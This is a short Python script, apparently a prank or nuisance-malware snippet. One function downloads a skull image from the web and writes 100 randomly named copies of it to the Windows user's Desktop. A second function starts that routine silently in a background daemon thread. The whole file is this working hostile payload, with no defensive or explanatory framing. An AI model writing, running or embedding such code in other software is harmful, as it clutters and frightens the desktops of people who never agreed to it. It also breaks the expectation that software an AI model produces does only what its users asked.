import os, random, string, requests, threading

def flood_images():
    image_url = "https://www.iconsdb.com/icons/preview/red/skull-68-xxl.png"
    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
    response = requests.get(image_url)
    for _ in range(100):
        filename = ''.join(random.choices(string.ascii_lowercase + string.digits, k=10)) + ".png"
        with open(os.path.join(desktop_path, filename), 'wb') as f:
            f.write(response.content)
def flood():
    threading.Thread(target=flood_images, daemon=True).start()